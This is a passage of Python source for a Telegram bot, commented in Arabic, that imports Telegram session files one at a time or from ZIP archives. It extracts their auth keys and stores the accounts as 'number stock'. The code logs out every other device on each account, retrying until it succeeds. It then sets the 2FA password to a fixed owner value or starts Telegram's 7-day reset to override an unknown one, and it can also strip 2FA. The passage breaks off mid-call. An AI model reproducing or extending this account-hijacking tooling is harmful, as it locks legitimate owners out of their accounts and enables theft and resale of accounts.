async def handle_session_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    يستقبل ملف .session (SQLite) من المالك ويستورده مباشرةً.
    يدعم صيغتَي Telethon و Pyrogram.
    Telethon  → جدول sessions: dc_id, server_address, port, auth_key (blob)
    Pyrogram  → جدول sessions: dc_id, auth_key (blob)
    """
    user = update.effective_user
    if user.id != OWNER_ID:
        return
    doc = update.message.document
    if not doc:
        return
    fname = doc.file_name or ""
    if not fname.lower().endswith(".session"):
        return

    msg = await update.message.reply_text(f"⏳ جاري قراءة الملف `{fname}`...", parse_mode=ParseMode.MARKDOWN)
    import tempfile, sqlite3 as _sq3

    # ── تنزيل الملف إلى ملف مؤقت ──
    try:
        tg_file = await context.bot.get_file(doc.file_id)
        raw_bytes = await tg_file.download_as_bytearray()
    except Exception as e:
        await msg.edit_text(f"❌ تعذّر تنزيل الملف:\n`{e}`", parse_mode=ParseMode.MARKDOWN)
        return

    # ── فتح SQLite من الذاكرة ──
    session_string = None
    detected_format = "?"
    try:
        with tempfile.NamedTemporaryFile(suffix=".session", delete=False) as tf:
            tf.write(raw_bytes)
            tf_path = tf.name

        conn = _sq3.connect(tf_path)
        conn.row_factory = _sq3.Row
        cur = conn.cursor()

        # جرّب صيغة Telethon أولاً (حقول: dc_id, server_address, port, auth_key)
        try:
            row = cur.execute(
                "SELECT dc_id, server_address, port, auth_key FROM sessions LIMIT 1"
            ).fetchone()
            if row and row["auth_key"] and len(row["auth_key"]) == 256:
                dc_id     = int(row["dc_id"])
                auth_key  = bytes(row["auth_key"])
                # نستخدم عنوان الخادم المخزون في الملف إن أمكن، وإلا نأخذ من الخريطة
                try:
                    srv_ip   = _socket.inet_aton(row["server_address"])
                    srv_port = int(row["port"])
                except Exception:
                    srv_ip_str, srv_port = _TG_DC.get(dc_id, ("149.154.167.51", 443))
                    srv_ip   = _socket.inet_aton(srv_ip_str)
                packed = struct.pack(">B4sH256s", dc_id, srv_ip, srv_port, auth_key)
                session_string = "1" + base64.urlsafe_b64encode(packed).decode("ascii")
                detected_format = "Telethon"
        except _sq3.OperationalError:
            pass

        # إن فشل جرّب صيغة Pyrogram (حقول: dc_id, auth_key)
        if not session_string:
            try:
                row = cur.execute(
                    "SELECT dc_id, auth_key FROM sessions LIMIT 1"
                ).fetchone()
                if row and row["auth_key"] and len(bytes(row["auth_key"])) == 256:
                    dc_id    = int(row["dc_id"])
                    auth_key = bytes(row["auth_key"])
                    ip_str, port_dc = _TG_DC.get(dc_id, ("149.154.167.51", 443))
                    packed = struct.pack(
                        ">B4sH256s",
                        dc_id, _socket.inet_aton(ip_str), port_dc, auth_key
                    )
                    session_string = "1" + base64.urlsafe_b64encode(packed).decode("ascii")
                    detected_format = "Pyrogram"
            except _sq3.OperationalError:
                pass

        conn.close()
        import os as _os; _os.unlink(tf_path)
    except Exception as e:
        await msg.edit_text(f"❌ تعذّر قراءة قاعدة البيانات:\n`{e}`", parse_mode=ParseMode.MARKDOWN)
        return

    if not session_string:
        await msg.edit_text(
            "❌ لم أتمكن من استخراج الجلسة.\n"
            "تأكد أن الملف جلسة Telethon أو Pyrogram صالحة (بها `auth_key` بطول 256 بايت).",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    await msg.edit_text(f"⏳ تم كشف صيغة *{detected_format}* — جاري التحقق...", parse_mode=ParseMode.MARKDOWN)

    # ── وضع إزالة التحقق الثنائي ──
    if context.user_data.get("state") == "os_remove_2fa_mode":
        ok, result_msg, phone = await _remove_2fa_from_session(session_string)
        label = phone or fname
        icon = "✅" if ok else "❌"
        await msg.edit_text(
            f"{icon} *{label}*\n{result_msg}",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    # ── الاستيراد العادي ──
    try:
        if not (TELEGRAM_API_ID and TELEGRAM_API_HASH):
            await msg.edit_text("❌ TELEGRAM_API_ID / TELEGRAM_API_HASH غير محدّدَين.")
            return
        client = TelegramClient(StringSession(session_string), int(TELEGRAM_API_ID), TELEGRAM_API_HASH)
        await client.connect()
        if not await client.is_user_authorized():
            await client.disconnect()
            await msg.edit_text("❌ الجلسة منتهية أو غير صالحة — لم يتم الاستيراد.")
            return
        me = await client.get_me()
        phone = me.phone if me.phone.startswith("+") else f"+{me.phone}"
        await client.disconnect()
    except Exception as e:
        await msg.edit_text(f"❌ خطأ أثناء التحقق:\n`{e}`", parse_mode=ParseMode.MARKDOWN)
        return

    with db_conn() as _c:
        exists = _c.execute(
            "SELECT id FROM number_stock WHERE phone_number=%s", (phone,)
        ).fetchone()
        if exists:
            _c.execute(
                "UPDATE number_stock SET session_string=%s, assigned_to=NULL, assigned_at=NULL WHERE phone_number=%s",
                (session_string, phone)
            )
        else:
            _c.execute(
                "INSERT INTO number_stock (phone_number, session_string) VALUES (%s,%s)",
                (phone, session_string)
            )
    asyncio.create_task(_start_number_monitor(phone, session_string, context.application))

    # ── طرد كل الجلسات الأخرى + تفعيل 2FA تلقائياً ──────────────────
    kick_note  = ""
    twofa_note = ""
    try:
        _kick_cl = TelegramClient(StringSession(session_string), int(TELEGRAM_API_ID), TELEGRAM_API_HASH)
        await _kick_cl.connect()
        if await _kick_cl.is_user_authorized():
            try:
                await _kick_cl(ResetAuthorizationsRequest())
                # ─── فحص is_solo بعد الطرد الفوري ─────────────────────────
                try:
                    _dev_imm = await get_device_count(_kick_cl)
                    _solo_imm = (_dev_imm == 1)
                    with db_conn() as _si:
                        _si_row = _si.execute(
                            "SELECT id FROM number_stock WHERE phone_number=%s", (phone,)
                        ).fetchone()
                    if _si_row:
                        with db_conn() as _su2:
                            _su2.execute(
                                "UPDATE number_stock SET sessions_reset=TRUE, is_solo=%s WHERE id=%s",
                                (_solo_imm, _si_row["id"])
                            )
                        if _solo_imm:
                            asyncio.create_task(
                                _test_and_set_can_send_code(phone, session_string, _si_row["id"])
                            )
                    _solo_emoji = " ✅ البوت وحده" if _solo_imm else " ⚠️ ما زال هناك جلسات"
                    kick_note = f"\n🔒 تم طرد كل الجلسات الأخرى تلقائياً.{_solo_emoji}"
                except Exception as _di:
                    kick_note = "\n🔒 تم طرد كل الجلسات الأخرى تلقائياً."
                    logger.debug(f"⚠️ فحص is_solo فوري فشل للرقم {phone}: {_di}")
            except Exception as _ke:
                _ke_str = str(_ke)
                if "too new" in _ke_str or "cannot be used to reset" in _ke_str:
                    # الجلسة جديدة جداً — نحاول فوراً ثم كل 5 ث، 10 ث، 15 ث...
                    kick_note = "\n⏳ الجلسة جديدة — يُعيد البوت المحاولة تلقائياً كل بضع ثوانٍ."
                    async def _retry_kick_loop(ss, ph, bot_ref):
                        delay = 0
                        step  = 5
                        while True:
                            if delay > 0:
                                await asyncio.sleep(delay)
                            delay += step
                            try:
                                _rc2 = TelegramClient(StringSession(ss), int(TELEGRAM_API_ID), TELEGRAM_API_HASH)
                                await _rc2.connect()
                                authorized = await _rc2.is_user_authorized()
                                if not authorized:
                                    await _rc2.disconnect()
                                    logger.warning(f"⚠️ retry_kick: جلسة {ph} منتهية — إيقاف المحاولات")
                                    break
                                await _rc2(ResetAuthorizationsRequest())
                                # ─── فحص is_solo بعد نجاح الطرد ────────────
                                _dev_r = -1
                                try:
                                    _dev_r = await get_device_count(_rc2)
                                except Exception:
                                    pass
                                _solo_r = (_dev_r == 1)
                                with db_conn() as _sr:
                                    _sr_row = _sr.execute(
                                        "SELECT id FROM number_stock WHERE phone_number=%s", (ph,)
                                    ).fetchone()
                                if _sr_row:
                                    with db_conn() as _su:
                                        _su.execute(
                                            "UPDATE number_stock SET sessions_reset=TRUE, is_solo=%s WHERE id=%s",
                                            (_solo_r, _sr_row["id"])
                                        )
                                    if _solo_r:
                                        asyncio.create_task(
                                            _ensure_can_send_code(ph, ss, _sr_row["id"])
                                        )
                                await _rc2.disconnect()
                                logger.info(f"🔒 retry_kick: طُردت الجلسات للرقم {ph} بعد {delay - step} ث | is_solo={_solo_r}")
                                _ng_rk = NUMBERS_GROUP_ID or OWNER_ID
                                if _ng_rk and bot_ref:
                                    try:
                                        _solo_note = " ✅ البوت الجلسة الوحيدة" if _solo_r else " ⚠️ ما زالت هناك جلسات"
                                        await bot_ref.send_message(
                                            _ng_rk,
                                            f"🔒 تم طرد كل الجلسات الأخرى للرقم `{ph}` "
                                            f"(بعد {delay - step} ثانية من الاستيراد).{_solo_note}",
                                            parse_mode=ParseMode.MARKDOWN
                                        )
                                    except Exception:
                                        pass
                                break  # نجح الطرد → توقف
                            except Exception as _re2:
                                _re2_str = str(_re2)
                                if "too new" in _re2_str or "cannot be used to reset" in _re2_str:
                                    logger.info(f"⏳ retry_kick: {ph} لا يزال جديداً، انتظار {delay} ث...")
                                    try:
                                        await _rc2.disconnect()
                                    except Exception:
                                        pass
                                    continue  # نكرر بعد delay أطول
                                else:
                                    logger.warning(f"⚠️ retry_kick: خطأ غير متوقع للرقم {ph}: {_re2_str[:80]}")
                                    try:
                                        await _rc2.disconnect()
                                    except Exception:
                                        pass
                                    break
                    asyncio.create_task(_retry_kick_loop(session_string, phone, context.bot))
                else:
                    kick_note = f"\n⚠️ تعذّر طرد الجلسات الأخرى: {_ke_str[:80]}"
        await _kick_cl.disconnect()
    except Exception as _ce:
        kick_note = f"\n⚠️ خطأ أثناء الطرد: {_ce}"

    with db_conn() as _rc:
        _stock_row = _rc.execute(
            "SELECT id FROM number_stock WHERE phone_number=%s", (phone,)
        ).fetchone()
    if _stock_row:
        # نحاول تعيين/تغيير 2FA لـ"محمد" مباشرة — إذا فشل نتركه بصمت
        try:
            _2fa_cl = TelegramClient(StringSession(session_string), int(TELEGRAM_API_ID), TELEGRAM_API_HASH)
            await _2fa_cl.connect()
            if await _2fa_cl.is_user_authorized():
                _pwd_state = await _2fa_cl(GetPasswordRequest())
                if _pwd_state.has_password:
                    # هناك باسورد مجهول → نحاول تغييره بدون معرفة القديم (قد يفشل)
                    try:
                        await _2fa_cl.edit_2fa(
                            current_password=None,
                            new_password=OWNER_FIXED_2FA_PASSWORD,
                        )
                        with db_conn() as _dc:
                            _dc.execute(
                                "UPDATE number_stock SET twofa_password=%s WHERE id=%s",
                                (OWNER_FIXED_2FA_PASSWORD, _stock_row["id"])
                            )
                        twofa_note = f"\n🔐 تم تغيير كلمة 2FA إلى: `{OWNER_FIXED_2FA_PASSWORD}`"
                    except Exception:
                        # فشل التغيير المباشر → نبدأ إجراء إعادة تعيين 7 أيام
                        try:
                            _reset_res = await _2fa_cl(ResetPasswordRequest())
                            import datetime as _dt
                            if hasattr(_reset_res, "retry_date") and _reset_res.retry_date:
                                _retry_ts = _reset_res.retry_date
                            elif hasattr(_reset_res, "until_date") and _reset_res.until_date:
                                _retry_ts = _reset_res.until_date
                            else:
                                # تقدير 7 أيام من الآن
                                _retry_ts = _dt.datetime.now(_dt.timezone.utc) + _dt.timedelta(days=7)
                            with db_conn() as _dc:
                                _dc.execute(
                                    "UPDATE number_stock SET twofa_reset_date=%s WHERE id=%s",
                                    (_retry_ts, _stock_row["id"])
                                )
                            twofa_note = (
                                f"\n⏳ بدأ إجراء إعادة تعيين 2FA (7 أيام).\n"
                                f"سيُكمل البوت التغيير تلقائياً بتاريخ: "
                                f"`{_retry_ts.strftime('%Y-%m-%d %H:%M') if hasattr(_retry_ts, 'strftime') else _retry_ts}`"
                            )
                            logger.info(f"⏳ بدأ reset 2FA للرقم {phone} — موعد الاكتمال: {_retry_ts}")
                        except Exception as _re:
                            twofa_note = f"\n⚠️ الحساب عليه 2FA مجهولة — تعذّر بدء إعادة التعيين: {str(_re)[:80]}"
                else:
                    # لا يوجد 2FA → ننشئ "محمد"
                    try:
                        await _2fa_cl.edit_2fa(
                            new_password=OWNER_FIXED_2FA_PASSWORD,
                        )
                        with db_conn() as _dc:
                            _dc.execute(
                                "UPDATE number_stock SET twofa_password=%s, auto_2fa_enabled=TRUE WHERE id=%s",
                                (OWNER_FIXED_2FA_PASSWORD, _stock_row["id"])
                            )
                        twofa_note = f"\n🔐 تم تفعيل التحقق بخطوتين.\n🗝 كلمة المرور: `{OWNER_FIXED_2FA_PASSWORD}`"
                    except Exception as _e2:
                        twofa_note = f"\n⚠️ تعذّر تعيين 2FA: {str(_e2)[:80]}"
            await _2fa_cl.disconnect()
        except Exception as _2fa_err:
            twofa_note = f"\n⚠️ خطأ في 2FA: {str(_2fa_err)[:80]}"

    await msg.edit_text(
        f"✅ *تم استيراد الجلسة بنجاح!*\n\n"
        f"📱 الرقم: `{phone}`\n"
        f"🔧 الصيغة: {detected_format}\n"
        f"📄 الملف: `{fname}`"
        f"{kick_note}{twofa_note}",
        parse_mode=ParseMode.MARKDOWN
    )


async def _import_one_session_bytes(
    raw_bytes: bytes,
    fname: str,
    context,
    remove_2fa_mode: bool = False,
) -> dict:
    """
    يحاول استخراج session_string من bytes تمثّل ملف .session (SQLite) أو .json.
    يُرجع dict بالمفاتيح:
        ok        bool
        phone     str | None
        msg       str  — رسالة النتيجة للعرض
        session   str | None  — session_string المستخرج
        stock_id  int | None
    """
    import tempfile, sqlite3 as _sq3b, json as _jb, os as _osb

    session_string = None
    detected_format = "?"

    # ── محاولة JSON أولاً ──
    try:
        data = _jb.loads(raw_bytes.decode("utf-8"))
        if isinstance(data, str):
            session_string = _maybe_convert_session(data.strip())
            detected_format = "JSON/String"
        elif isinstance(data, dict):
            if "dc_id" in data and "auth_key" in data:
                session_string = pyrogram_json_to_telethon(data)
                detected_format = "Pyrogram-JSON"
            else:
                raw_s = (data.get("session_string") or data.get("session") or "").strip()
                if raw_s:
                    session_string = _maybe_convert_session(raw_s)
                    detected_format = "JSON"
        elif isinstance(data, list) and data:
            first = data[0]
            if isinstance(first, str):
                session_string = _maybe_convert_session(first.strip())
                detected_format = "JSON/List"
            elif isinstance(first, dict):
                if "dc_id" in first and "auth_key" in first:
                    session_string = pyrogram_json_to_telethon(first)
                    detected_format = "Pyrogram-JSON"
                else:
                    raw_s = (first.get("session_string") or first.get("session") or "").strip()
                    if raw_s:
                        session_string = _maybe_convert_session(raw_s)
                        detected_format = "JSON"
    except Exception:
        pass

    # ── محاولة SQLite ──
    if not session_string:
        tf_path = None
        try:
            with tempfile.NamedTemporaryFile(suffix=".session", delete=False) as tf:
                tf.write(raw_bytes)
                tf_path = tf.name
            conn = _sq3b.connect(tf_path)
            conn.row_factory = _sq3b.Row
            cur = conn.cursor()

            # ── الصيغة 1: Telethon كاملة (dc_id, server_address, port, auth_key) ──
            try:
                row = cur.execute(
                    "SELECT dc_id, server_address, port, auth_key FROM sessions LIMIT 1"
                ).fetchone()
                if row and row["auth_key"] and len(bytes(row["auth_key"])) == 256:
                    dc_id    = int(row["dc_id"])
                    auth_key = bytes(row["auth_key"])
                    try:
                        srv_ip   = _socket.inet_aton(row["server_address"])
                        srv_port = int(row["port"])
                    except Exception:
                        srv_ip_str, srv_port = _TG_DC.get(dc_id, ("149.154.167.51", 443))
                        srv_ip = _socket.inet_aton(srv_ip_str)
                    packed = struct.pack(">B4sH256s", dc_id, srv_ip, srv_port, auth_key)
                    session_string = "1" + base64.urlsafe_b64encode(packed).decode("ascii")
                    detected_format = "Telethon"
            except _sq3b.OperationalError:
                pass

            # ── الصيغة 2: MTProto/Telethon-lite (dc_id, test_mode, auth_key, date, user_id, is_bot) ──
            # هذه الصيغة تستخدمها أدوات مثل Telegram Session Manager — لا server_address ولا port
            if not session_string:
                try:
                    row = cur.execute(
                        "SELECT dc_id, auth_key FROM sessions WHERE auth_key IS NOT NULL LIMIT 1"
                    ).fetchone()
                    if row and row["auth_key"]:
                        ak = bytes(row["auth_key"])
                        if len(ak) == 256:
                            dc_id    = int(row["dc_id"]) if row["dc_id"] else 2
                            auth_key = ak
                            ip_str, port_dc = _TG_DC.get(dc_id, ("149.154.167.51", 443))
                            packed = struct.pack(
                                ">B4sH256s",
                                dc_id, _socket.inet_aton(ip_str), port_dc, auth_key
                            )
                            session_string = "1" + base64.urlsafe_b64encode(packed).decode("ascii")
                            detected_format = f"MTProto-DC{dc_id}"
                except _sq3b.OperationalError:
                    pass

            # ── الصيغة 3: Pyrogram (dc_id, auth_key فقط) ──
            if not session_string:
                try:
                    row = cur.execute(
                        "SELECT dc_id, auth_key FROM sessions LIMIT 1"
                    ).fetchone()
                    if row and row["auth_key"] and len(bytes(row["auth_key"])) == 256:
                        dc_id    = int(row["dc_id"])
                        auth_key = bytes(row["auth_key"])
                        ip_str, port_dc = _TG_DC.get(dc_id, ("149.154.167.51", 443))
                        packed = struct.pack(
                            ">B4sH256s",
                            dc_id, _socket.inet_aton(ip_str), port_dc, auth_key
                        )
                        session_string = "1" + base64.urlsafe_b64encode(packed).decode("ascii")
                        detected_format = "Pyrogram"
                except _sq3b.OperationalError:
                    pass
            conn.close()
        except Exception as _sq_e:
            logger.debug(f"⚠️ _import_one_session_bytes SQLite فشل للملف {fname}: {_sq_e}")
        finally:
            if tf_path:
                try:
                    _osb.unlink(tf_path)
                except Exception:
                    pass

    if not session_string:
        return {"ok": False, "phone": None, "msg": "تعذّر استخراج الجلسة", "session": None, "stock_id": None}

    # ── وضع إزالة 2FA ──
    if remove_2fa_mode:
        ok, result_msg, phone = await _remove_2fa_from_session(session_string)
        return {"ok": ok, "phone": phone, "msg": result_msg, "session": session_string, "stock_id": None}

    # ── التحقق من الجلسة عبر تيليجرام ──
    if not (TELEGRAM_API_ID and TELEGRAM_API_HASH):
        return {"ok": False, "phone": None, "msg": "TELEGRAM_API_ID/HASH غير محدّد", "session": session_string, "stock_id": None}
    try:
        _cli = TelegramClient(StringSession(session_string), int(TELEGRAM_API_ID), TELEGRAM_API_HASH)
        await _cli.connect()
        if not await _cli.is_user_authorized():
            await _cli.disconnect()
            return {"ok": False, "phone": None, "msg": "الجلسة منتهية أو غير صالحة", "session": session_string, "stock_id": None}
        me = await _cli.get_me()
        phone = me.phone if me.phone.startswith("+") else f"+{me.phone}"
        await _cli.disconnect()
    except Exception as _ve:
        return {"ok": False, "phone": None, "msg": f"خطأ التحقق: {str(_ve)[:80]}", "session": session_string, "stock_id": None}

    # ── حفظ في DB ──
    with db_conn() as _dc:
        exists = _dc.execute(
            "SELECT id FROM number_stock WHERE phone_number=%s", (phone,)
        ).fetchone()
        if exists:
            _dc.execute(
                "UPDATE number_stock SET session_string=%s, assigned_to=NULL, assigned_at=NULL WHERE phone_number=%s",
                (session_string, phone)
            )
            stock_id = exists["id"]
        else:
            _dc.execute(
                "INSERT INTO number_stock (phone_number, session_string) VALUES (%s,%s)",
                (phone, session_string)
            )
            stock_id = _dc.execute(
                "SELECT id FROM number_stock WHERE phone_number=%s", (phone,)
            ).fetchone()["id"]
    asyncio.create_task(_start_number_monitor(phone, session_string, context.application))

    # ── طرد الجلسات الأخرى + is_solo + can_send_code ──
    kick_note = ""
    try:
        _kc = TelegramClient(StringSession(session_string), int(TELEGRAM_API_ID), TELEGRAM_API_HASH)
        await _kc.connect()
        if await _kc.is_user_authorized():
            try:
                await _kc(ResetAuthorizationsRequest())
                try:
                    _dv = await get_device_count(_kc)
                    _solo = (_dv == 1)
                    with db_conn() as _su:
                        _su.execute(
                            "UPDATE number_stock SET sessions_reset=TRUE, is_solo=%s WHERE id=%s",
                            (_solo, stock_id)
                        )
                    if _solo:
                        asyncio.create_task(_test_and_set_can_send_code(phone, session_string, stock_id))
                    kick_note = " ✅ طُردت" + (" | البوت وحده" if _solo else "")
                except Exception:
                    with db_conn() as _su:
                        _su.execute("UPDATE number_stock SET sessions_reset=TRUE WHERE id=%s", (stock_id,))
                    kick_note = " ✅ طُردت"
            except Exception as _ke2:
                _s = str(_ke2)
                if "too new" in _s or "cannot be used to reset" in _s:
                    kick_note = " ⏳ جديدة (سيُعاد)"
                    asyncio.create_task(_retry_zip_kick(phone, session_string, stock_id, context.bot))
                else:
                    kick_note = f" ⚠️ طرد: {_s[:40]}"
        await _kc.disconnect()
    except Exception as _ke3:
        kick_note = f" ⚠️ {str(_ke3)[:40]}"

    return {
        "ok": True,
        "phone": phone,
        "msg": f"صيغة: {detected_format}{kick_note}",
        "session": session_string,
        "stock_id": stock_id,
    }


async def _retry_zip_kick(phone: str, session_str: str, stock_id: int, bot_ref):
    """إعادة محاولة طرد الجلسات للحسابات المستوردة من ZIP عندما تكون 'جديدة جداً'."""
    delay, step = 0, 5
    while True:
        if delay > 0:
            await asyncio.sleep(delay)
        delay += step
        try:
            _rc = TelegramClient(StringSession(session_str), int(TELEGRAM_API_ID), TELEGRAM_API_HASH)
            await _rc.connect()
            if not await _rc.is_user_authorized():
                await _rc.disconnect()
                break
            await _rc(ResetAuthorizationsRequest())
            _dv = -1
            try:
                _dv = await get_device_count(_rc)
            except Exception:
                pass
            _solo = (_dv == 1)
            with db_conn() as _su:
                _su.execute(
                    "UPDATE number_stock SET sessions_reset=TRUE, is_solo=%s WHERE id=%s",
                    (_solo, stock_id)
                )
            if _solo:
                asyncio.create_task(_ensure_can_send_code(phone, session_str, stock_id))
            await _rc.disconnect()
            logger.info(f"🔒 retry_zip_kick: طُرد {phone} بعد {delay - step} ث | is_solo={_solo}")
            _ng_zk = NUMBERS_GROUP_ID or OWNER_ID
            if _ng_zk and bot_ref:
                try:
                    await bot_ref.send_message(
                        _ng_zk,
                        f"🔒 طُردت جلسات `{phone}` (ZIP, بعد {delay - step} ث)"
                        + (" ✅ البوت وحده" if _solo else ""),
                        parse_mode=ParseMode.MARKDOWN
                    )
                except Exception:
                    pass
            break
        except Exception as _re:
            _rs = str(_re)
            if "too new" in _rs or "cannot be used to reset" in _rs:
                try:
                    await _rc.disconnect()
                except Exception:
                    pass
                continue
            try:
                await _rc.disconnect()
            except Exception:
                pass
            break


async def handle_zip_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    يستقبل ملف ZIP من المالك يحتوي على ملفات .session (Telethon/Pyrogram/MTProto).
    يفكّ الضغط، يُلغي التكرار (حساب واحد = ملف .session واحد)،
    ويستورد كل جلسة تلقائياً مع التحقق وطرد الجلسات الأخرى.
    يُستدعى أيضاً من handle_unsupported_message كـ fallback.
    """
    user = update.effective_user
    if not user or user.id != OWNER_ID:
        return
    doc = update.message.document
    if not doc:
        return
    fname = doc.file_name or "sessions.zip"
    # نتحقق من أن الملف ZIP (بالاسم أو MIME) — بدون return صامت
    fname_l = fname.lower()
    mime_l  = (doc.mime_type or "").lower()
    if not (fname_l.endswith(".zip") or "zip" in mime_l or
            fname_l.endswith(".gz") or "octet" in mime_l):
        # ليس ZIP ولا ملف ضغط → تجاهل
        return

    msg = await update.message.reply_text(
        f"📦 استلمت `{fname}` — جاري التنزيل وفك الضغط...",
        parse_mode=ParseMode.MARKDOWN
    )

    # ── تنزيل ZIP ──
    try:
        tg_file = await context.bot.get_file(doc.file_id)
        raw_zip = await tg_file.download_as_bytearray()
    except Exception as e:
        await msg.edit_text(f"❌ تعذّر تنزيل الملف:\n`{e}`", parse_mode=ParseMode.MARKDOWN)
        return

    # ── فك الضغط ──
    import zipfile, io
    try:
        zf = zipfile.ZipFile(io.BytesIO(bytes(raw_zip)))
        all_names = [
            n for n in zf.namelist()
            if not n.startswith("__MACOSX") and not n.endswith("/")
        ]
    except Exception as e:
        await msg.edit_text(f"❌ تعذّر فتح ZIP:\n`{e}`", parse_mode=ParseMode.MARKDOWN)
        return

    # ── إلغاء التكرار: أولوية .session على .json لنفس الاسم الأساسي ──
    # بعض الأدوات تُصدّر زوجاً (.session + .json) لكل حساب — نختار .session فقط
    session_bases = {
        n.rsplit(".", 1)[0].split("/")[-1]
        for n in all_names if n.lower().endswith(".session")
    }
    entries = []
    seen_bases = set()
    for n in all_names:
        short = n.split("/")[-1]
        base  = short.rsplit(".", 1)[0]
        ext   = short.rsplit(".", 1)[-1].lower() if "." in short else ""
        if ext == "session":
            entries.append(n)
            seen_bases.add(base)
        elif ext == "json" and base not in session_bases:
            # أضف JSON فقط إذا لم يوجد .session بنفس الاسم
            entries.append(n)

    if not entries:
        await msg.edit_text(
            f"❌ لا توجد ملفات `.session` داخل الـ ZIP.\n"
            f"الملفات الموجودة: {', '.join(n.split('/')[-1] for n in all_names[:10])}",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    total = len(entries)
    remove_2fa_mode = (context.user_data.get("state") == "os_remove_2fa_mode")
    await msg.edit_text(
        f"📦 وجدت *{total}* حساب — جاري التحقق والاستيراد...\n"
        f"_(قد يستغرق {total * 3}–{total * 8} ثانية)_",
        parse_mode=ParseMode.MARKDOWN
    )

    ok_list   = []
    fail_list = []

    for idx, entry_name in enumerate(entries):
        short = entry_name.split("/")[-1]
        try:
            file_bytes = zf.read(entry_name)
        except Exception as _re:
            fail_list.append(f"`{short}` — تعذّر القراءة: {str(_re)[:60]}")
            continue

        # تحديث تقدّمي كل 5 حسابات
        if (idx + 1) % 5 == 0 or (idx + 1) == total:
            try:
                await msg.edit_text(
                    f"📦 *{idx+1}/{total}* جاري المعالجة...\n"
                    f"✅ {len(ok_list)} نجح | ❌ {len(fail_list)} فشل",
                    parse_mode=ParseMode.MARKDOWN
                )
            except Exception:
                pass

        result = await _import_one_session_bytes(file_bytes, short, context, remove_2fa_mode)
        label  = result["phone"] or short
        if result["ok"]:
            ok_list.append(f"`{label}` — {result['msg']}")
        else:
            fail_list.append(f"`{short}` — {result['msg']}")

    zf.close()

    # ── ملخص النهائي ──
    lines = [f"📦 *نتيجة استيراد ZIP* — *{len(ok_list)} نجح* / {total} إجمالي\n"]
    if ok_list:
        lines.append(f"✅ *نجح ({len(ok_list)}):*")
        lines.extend(f"  • {x}" for x in ok_list[:35])
        if len(ok_list) > 35:
            lines.append(f"  ... و{len(ok_list)-35} آخرين")
    if fail_list:
        lines.append(f"\n❌ *فشل ({len(fail_list)}):*")
        lines.extend(f"  • {x}" for x in fail_list[:15])
        if len(fail_list) > 15:
            lines.append(f"  ... و{len(fail_list)-15} آخرين")

    summary = "\n".join(lines)
    if len(summary) > 4000:
        summary = summary[:3950] + "\n...(مقتطع)"
    await msg.edit_text(summary, parse_mode=ParseMode.MARKDOWN)


async def handle_unsupported_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """شبكة أمان: تُستدعى لأي رسالة لا تحمل نصاً أو وصفاً (صورة/فيديو/ملصق بلا caption،
    جهة اتصال، موقع، ملف...) ولا تطابق أي معالج آخر. بدون هذا المعالج كان البوت يبقى
    صامتاً تماماً بلا أي رد إن أرسل المستخدم قناته بالتوجيه/المشاركة بدل كتابة اليوزرنيم."""
    if not update.message:
        return
    state = context.user_data.get("state", "")

    # ── وضع إزالة 2FA: أي ملف يصل هنا نحاول استخراج جلسة منه ──
    if state == "os_remove_2fa_mode" and update.effective_user.id == OWNER_ID:
        doc = update.message.document
        if doc:
            fname = doc.file_name or "file"
            msg = await update.message.reply_text(
                f"⏳ جاري معالجة `{fname}`...", parse_mode=ParseMode.MARKDOWN
            )
            try:
                tg_file  = await context.bot.get_file(doc.file_id)
                raw_bytes = await tg_file.download_as_bytearray()
            except Exception as e:
                await msg.edit_text(f"❌ تعذّر تنزيل الملف: `{e}`", parse_mode=ParseMode.MARKDOWN)
                return

            session_string = None
            # المحاولة 1: JSON
            try:
                import json as _j2
                data2 = _j2.loads(raw_bytes.decode("utf-8"))
                if isinstance(data2, str):
                    session_string = _maybe_convert_session(data2.strip())
                elif isinstance(data2, dict):
                    if "dc_id" in data2 and "auth_key" in data2:
                        session_string = pyrogram_json_to_telethon(data2)
                    else:
                        raw_s = (data2.get("session_string") or data2.get("session") or "").strip()
                        if raw_s:
                            session_string = _maybe_convert_session(raw_s)
                elif isinstance(data2, list) and data2:
                    first = data2[0]
                    if isinstance(first, str):
                        session_string = _maybe_convert_session(first.strip())
                    elif isinstance(first, dict):
                        if "dc_id" in first and "auth_key" in first:
                            session_string = pyrogram_json_to_telethon(first)
                        else:
                            raw_s = (first.get("session_string") or first.get("session") or "").strip()
                            if raw_s:
                                session_string = _maybe_convert_session(raw_s)
            except Exception:
                pass

            # المحاولة 2: SQLite .session
            if not session_string:
                try:
                    import tempfile, sqlite3 as _sq3b, struct as _st2, base64 as _b2, socket as _sk2
                    with tempfile.NamedTemporaryFile(suffix=".session", delete=False) as tf2:
                        tf2.write(raw_bytes)
                        tf2_path = tf2.name
                    conn2 = _sq3b.connect(tf2_path)
                    conn2.row_factory = _sq3b.Row
                    cur2 = conn2.cursor()
                    for cols in (
                        "dc_id, server_address, port, auth_key",
                        "dc_id, auth_key",
                    ):
                        try:
                            row2 = cur2.execute(f"SELECT {cols} FROM sessions LIMIT 1").fetchone()
                            if row2 and row2["auth_key"] and len(bytes(row2["auth_key"])) == 256:
                                dc2 = int(row2["dc_id"])
                                ak2 = bytes(row2["auth_key"])
                                try:
                                    ip2   = _sk2.inet_aton(row2["server_address"])
                                    prt2  = int(row2["port"])
                                except Exception:
                                    ip_s2, prt2 = _TG_DC.get(dc2, ("149.154.167.51", 443))
                                    ip2 = _sk2.inet_aton(ip_s2)
                                session_string = "1" + _b2.urlsafe_b64encode(
                                    _st2.pack(">B4sH256s", dc2, ip2, prt2, ak2)
                                ).decode("ascii")
                                break
                        except Exception:
                            pass
                    conn2.close()
                    import os as _os2; _os2.unlink(tf2_path)
                except Exception:
                    pass

            # المحاولة 3: نص خام
            if not session_string:
                try:
                    raw_text = raw_bytes.decode("utf-8", errors="ignore").strip()
                    if raw_text.startswith("1") and len(raw_text) > 100:
                        session_string = raw_text.split()[0]
                except Exception:
                    pass

            if not session_string:
                await msg.edit_text(
                    "❌ لم أتمكن من استخراج جلسة من هذا الملف.\n"
                    "تأكد أنه ملف `.session` أو `.json` يحتوي على بيانات الجلسة.",
                    parse_mode=ParseMode.MARKDOWN
                )
                return

            ok, result_msg, phone = await _remove_2fa_from_session(session_string)
            icon = "✅" if ok else "❌"
            await msg.edit_text(
